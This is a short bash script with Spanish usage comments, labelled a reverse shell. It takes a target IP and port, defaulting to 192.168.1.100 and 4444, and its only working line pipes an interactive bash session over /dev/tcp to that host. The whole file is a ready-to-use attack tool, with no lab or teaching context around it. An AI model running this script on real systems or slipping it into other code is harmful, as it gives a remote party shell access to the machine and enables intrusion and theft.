#!/bin/bash
# Reverse Shell - Bash
# Uso: ./revshell.sh <IP> <PUERTO>
IP=${1:-192.168.1.100}
PORT=${2:-4444}
bash -i >& /dev/tcp/$IP/$PORT 0>&1
